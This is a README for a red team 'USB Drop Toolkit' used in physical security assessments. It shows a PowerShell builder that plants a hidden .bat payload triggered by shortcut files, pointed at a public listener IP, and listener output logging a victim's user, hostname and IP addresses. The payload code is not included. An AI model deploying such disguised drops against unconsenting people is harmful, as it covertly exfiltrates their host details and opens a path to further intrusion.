# USB Drop Toolkit
___
USB Drop Toolkit is a red team utility designed for physical security assessments where USB drops are part of the engagement. This toolkit includes:
	•	A PowerShell script to format USB drives with hidden .bat payload executed by shortcut files.
	•	A listener to capture exfiltrated host and network details

Base version of this isn't built for C2, but totally could be... just not worth the maintenance here...
___
## Usage

1. Use usb_drop_builder.ps1 to generate USB with hidden .bat paylaod.
```ps1
PS C:\Users\matt\Downloads> .\usb_drop_builder.ps1 54.218.99.118
Select a USB drive to format and prepare:
[0] E: WORK_DOCS (28.89 GB free)
Enter number of drive to use: 0

[+] USB drop successfully created at E:\
DriveLetter FriendlyName FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining     Size
----------- ------------ -------------- --------- ------------ ----------------- -------------     ----
E           WORK_DOCS    FAT32          Removable Healthy      OK                     28.89 GB 28.89 GB
```
2. Start publicly accessible listener... then profit:
```bash
./usb_listener.sh
[*] Listening on port 8080
[*] Logging to ./usb_drop_logs.txt

=== Hit @ 2025-06-05 03:42:58 ===
User: hackerman\matt
Hostname: Hackerman
Internal IPs:
IPv4 Address. . . . . . . . . . . : <redacted-ip>
IPv4 Address. . . . . . . . . . . : <redacted-ip>
External IP Address: <redacted-ip>
```
